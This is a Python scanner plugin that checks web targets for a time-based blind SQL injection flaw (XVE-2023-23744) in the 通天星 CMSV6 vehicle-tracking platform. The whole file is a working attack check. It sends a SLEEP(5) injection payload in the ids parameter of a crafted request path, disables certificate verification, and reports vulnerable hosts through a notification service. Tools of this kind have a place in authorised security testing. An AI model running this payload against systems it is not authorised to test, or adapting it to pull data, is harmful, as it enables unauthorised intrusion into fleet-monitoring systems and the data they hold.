
import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

#bugName = '通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)'


def scan_XVE_2023_23744(url, proxies, headers, append_to_output, serverJ,bugName):
    path = "/run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
    }

    encodetext = url + path

    try:
        expected_time = 5  # 期望的回包时间，单位为秒
        start_time = time.time()
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(encodetext, headers=headers, verify=False, timeout=10, proxies=proxies)
        res = req.text
        end_time = time.time()
        response_time = end_time - start_time
        if response_time >= expected_time and req.status_code == 200:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send({bugName}, f"漏洞连接: {url}\r ", ServerJ_switch=serverJ)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
